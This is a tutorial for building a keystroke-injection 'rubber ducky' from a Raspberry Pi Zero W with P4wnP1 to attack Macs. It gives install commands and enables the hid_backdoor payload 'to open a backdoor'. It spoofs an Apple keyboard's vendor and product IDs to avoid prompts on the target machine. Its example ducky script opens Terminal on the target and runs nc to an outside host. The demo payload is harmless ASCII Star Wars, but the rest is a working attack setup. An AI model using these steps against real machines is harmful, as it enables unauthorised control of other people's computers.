# Pi zero rubber ducky OSX

## What you will need: 
* Raspberry-pi-zero-w
* USB to ethernet adapter
* SSD card 
* Montor with HDMI 
* Pi-HDMI-Mini HDMI Adapter-Micro



## How to install

### Downlaod and Install Raspbian Lite
Download the [Stretch Lite image](https://www.raspberrypi.org/downloads/raspbian/) to your computer and 
write the image to the your SD card. I recommend using [etcher](https://www.balena.io/etcher/)


### Setting up P4wnP1
Connect your PI to a monitor, and use the USB to ethernet adapter to get internet connection. This can be done with wifi sharing, from your computer, but I found it easier to just connect it directly to your router. (Note that the Raspberry Pi zero w comes with two micro usb ports, where only the left can read data.) So make sure that the power comes from the right usb port and the USB to ethernet adapter is connected to the left usb port. 

Once connected you need to install P4wnP1 (This takes a good amount of time) 

```
sudo apt-get -y install git
cd /home/pi
git clone --recursive https://github.com/mame82/P4wnP1
cd P4wnP1
./install.sh
```
Once the installation is done, move to the next section. 

### Change payload: 
Now we need to change the payload to open a backdoor for us.
```
nano P4wnP1/setup.cfg
```

Change line 134 
from: 
```
PAYLOAD=network_only.txt
```

to:
```
#PAYLOAD=network_only.txt
```
Change line 146
from:
```
#PAYLOAD=hid_backdoor.txt # under (heavy) development
```

to:
```
PAYLOAD=hid_backdoor.txt # under (heavy) development
```

### Making it work for OSX
There are a few issues that needs to be resolved before we can make run our USB rubber ducky on OSX, if you are intrested in reading more about them you can do so [her](https://github.com/mame82/P4wnP1/issues/168).

First we have to change vendor and product id to Apple keyboard id in setup.cfg and in hid_keyboard.txt. This is important because otherwise the OSX will ask us to set up a keyboard everytime we plug in our rubber ducky. 

```
nano P4wnP1/setup.cfg
```
Change line 13 and 14 to: 
from:
```
USB_VID="0x1d6b"        # Vendor ID
USB_PID="0x0137"        # Product ID
```

to:
```
USB_VID="0x05ac"        # Vendor ID
USB_PID="0x024f"        # Product ID
```

There is also a second issue that is addressed in the issue post liked above, and that is that there is a command in boot_P4wnP1 that just hangs forever. A solution by the user @izeau that worked is to simply add a timeout to the line of code that causes this problem. 

```
nano  P4wnP1/boot/boot_P4wnP1
```
Change line 200

from: 
```
python -c "with open('/dev/hidg0','rb') as f:  print ord(f.read(1))"
```

to:
```
timeout 5 python -c "with open('/dev/hidg0','rb') as f:  print ord(f.read(1))"
```

## Add your ducky scripts:
The ducky scripts that comes with P4wnP1 are not for OSX, and you will therefor have to write these yourself. There are some ducky script available online that you can check out [her](https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payloads), however I would recommend to just add my simple ducky script first to make sure everything works. 

To add a ducky script simply do the following: 

```
cd P4wnP1/DuckyScripts
touch StartWars.duck
nano StartWars.duck
```
Add the following script: 
```
GUI SPACE
DELAY 500
STRING terminal
DELAY 500
ENTER
DELAY 1000
STRING nc towel.blinkenlights.nl 23
DELAY 500
ENTER
DELAY 500

```

## Select your starwars fan
Select your target mac and connect the Pi to it.(You only need to use the usb data port now, since the pi will get power from the target machine.). Once connected the PI will create a WIFI network named P4wnP1. Connect to the network with the password: "MaMe82-P4wnP1". Once connected to the network you can SSH into your pi: 

```
ssh pi@172.24.0.1 
```
Password for SSH is: raspberry 

First type:
```
SendDuckyScripts
```
this will enable us to see all the available duckyscripts and run them. In our case, we want to run the Star Wars script so simply type
```
StartWars.duck
```
Your target will now be shown Star Wars episode IV in ASCII. 

## Credit
**mame82** https://github.com/mame82/P4wnP1/blob/master/INSTALL.md

**Seytonic** https://www.youtube.com/watch?v=Pft7voW5ui8&t=413s
